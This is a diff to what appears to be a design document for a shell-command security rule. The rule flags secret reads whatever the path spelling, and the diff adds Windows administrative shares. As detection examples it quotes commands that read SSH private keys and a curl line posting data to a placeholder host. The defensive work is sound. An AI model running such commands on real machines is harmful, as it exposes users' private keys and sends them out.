@@ -5114,8 +5114,10 @@ curl -d @- https://x.example` is `read_secret` for the `cat`.
 
 The file is judged by what it resolves to, as for every rule: `~`, `$HOME`,
 `${HOME}`, `..`, doubled separators, case (on every host), a Windows short
-name, a long path, a device path, a Mac's links to the root, another user's
-home, all by [core](core.md). The shell's syntax adds:
+name, a long path, a device path, an administrative share of this machine
+(`type \\localhost\C$\Users\me\.ssh\id_rsa` reads the key on `C:`), a Mac's
+links to the root, another user's home, all by [core](core.md). The shell's
+syntax adds:
 
 - A brace list is spelled out first: `cat ~/.ssh/{id_rsa,x}` and
   `cp ~/.ssh/id_{rsa,ed25519} /tmp` read `~/.ssh/id_rsa`; a list that makes
